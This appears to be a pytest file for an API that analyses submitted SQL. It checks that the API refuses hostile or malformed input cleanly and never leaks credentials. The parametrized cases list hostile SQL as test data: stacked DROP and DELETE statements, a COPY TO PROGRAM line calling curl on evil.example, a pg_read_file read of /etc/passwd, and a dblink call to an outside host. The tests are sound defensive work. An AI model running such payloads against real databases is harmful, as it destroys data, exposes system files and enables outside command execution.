"""Hostile and malformed inputs: the API must refuse them cleanly (4xx with a code), never crash (5xx) and never touch
the database. These pin the safety rules of the spec (section 11) at the HTTP boundary."""

import pytest
from sqlalchemy import select
from test_benchmarks_api import analyse, approve, client, make_client, runner  # noqa: F401  (fixtures + helpers)

from app.models import Analysis, BenchmarkRun


def post(client, sql, params=(), **extra):
    pid = client.get("/api/projects").json()[0]["id"]
    return client.post("/api/analyses", json={"sql": sql, "params": list(params), "execute": True, "project_id": pid, **extra})


@pytest.mark.parametrize(
    "sql,code",
    [
        ("SELECT 1 -- harmless\n; DROP TABLE orders", "multiple_statements"),
        ("SELECT 1; /* hidden */ DELETE FROM orders", "multiple_statements"),
        ("SELECT 1;SELECT pg_sleep(100)", "multiple_statements"),
        ("WITH x AS (SELECT 1) SELECT * FROM x; TRUNCATE orders", "multiple_statements"),
        ("/* a */ DROP /* b */ TABLE orders", "not_select"),
        ("COPY orders TO PROGRAM 'curl evil.example'", "not_select"),
        ("CREATE INDEX ON orders (id)", "not_select"),
        ("SELECT * INTO backup FROM orders", "not_select"),
        ("SELECT * FROM orders FOR UPDATE", "not_select"),
        ("SELECT pg_read_file('/etc/passwd')", "denied_function"),
        ("SELECT * FROM dblink('host=evil.example', 'select 1') AS t(a int)", "denied_function"),
        ("SELECT set_config('statement_timeout', '0', false)", "denied_function"),
        ("SELECT pg_terminate_backend(pid) FROM pg_stat_activity", "denied_function"),
        ("EXPLAIN ANALYZE DELETE FROM orders", "explain_not_allowed"),
        ("   ", "parse_error"),
    ],
)
def test_hostile_sql_is_refused_before_anything_runs(client, stub, sql, code):
    response = post(client, sql)
    assert response.status_code == 422, response.text
    assert response.json()["detail"]["code"] == code
    assert stub.explain_calls == []  # nothing reached the (stubbed) database


@pytest.mark.parametrize(
    "sql",
    ["SELECT '; DROP TABLE orders; --'", "SELECT $$; DROP TABLE orders; $$", "SELECT * FROM orders WHERE note = '$1'"],
)
def test_semicolons_inside_string_literals_are_not_statement_separators(client, sql):
    assert post(client, sql).status_code == 202


def test_enormous_inputs_are_refused_without_a_server_error(client):
    assert post(client, "SELECT '" + "a" * 100_000 + "'").status_code == 422
    assert post(client, "SELECT $1", params=list(range(10_000))).status_code == 422
    assert post(client, "SELECT 1", params=[1] * 10).status_code == 422


@pytest.mark.parametrize("params", [[{"a": 1}], [[1, 2]], [None, {"x": 1}]])
def test_structured_parameters_never_reach_the_database(client, stub, params):
    response = post(client, "SELECT $1, $2", params=params)
    assert response.status_code == 422 and response.json()["detail"]["code"] == "param_mismatch"
    assert stub.explain_calls == []


def test_malformed_requests_are_422_not_500(client):
    pid = client.get("/api/projects").json()[0]["id"]
    for body in ({}, {"sql": 5, "project_id": pid}, {"sql": "SELECT 1"}, {"sql": "SELECT 1", "project_id": "x"}, {"sql": None, "project_id": pid}):
        assert client.post("/api/analyses", json=body).status_code == 422
    assert client.post("/api/analyses", content=b"not json", headers={"content-type": "application/json"}).status_code == 422
    assert client.get("/api/analyses/not-a-number").status_code == 422
    assert client.get("/api/benchmarks/not-a-number").status_code == 422


def test_a_racing_second_approval_is_resolved_by_the_database_not_a_second_run(make_client, monkeypatch):
    """Two requests both see 'no active run' and both try to insert: the unique index lets only one win, and the loser
    is handed the winner's run."""
    import app.api.benchmarks as module

    with make_client(enqueue_benchmark=lambda run_id: None) as client:
        analysis = analyse(client)
        first = approve(client, analysis)
        original = module._active_run
        calls = {"n": 0}

        def blind_first_check(session, candidate_id):
            calls["n"] += 1
            return None if calls["n"] == 1 else original(session, candidate_id)

        monkeypatch.setattr(module, "_active_run", blind_first_check)
        second = approve(client, analysis)
        assert second.status_code == 200 and second.json()["id"] == first.json()["id"]
        session = client.app.state.sessionmaker()
        assert len(session.scalars(select(BenchmarkRun)).all()) == 1


def test_a_cancelled_analysis_cannot_be_benchmarked_into_validity(client):
    analysis = analyse(client)
    session = client.app.state.sessionmaker()
    record = session.get(Analysis, analysis["id"])
    record.status = "cancelled"
    session.commit()
    assert approve(client, analysis).status_code == 409


def test_responses_never_leak_connection_strings_or_credentials(client):
    analysis = analyse(client)
    approve(client, analysis)
    for url in (f"/api/analyses/{analysis['id']}", f"/api/analyses/{analysis['id']}/report?format=md",
                f"/api/analyses/{analysis['id']}/report?format=html", "/api/projects", "/api/sample-queries"):
        body = client.get(url).text.lower()
        assert "postgresql://" not in body and "qd_readonly" not in body and "qd_bench" not in body, url
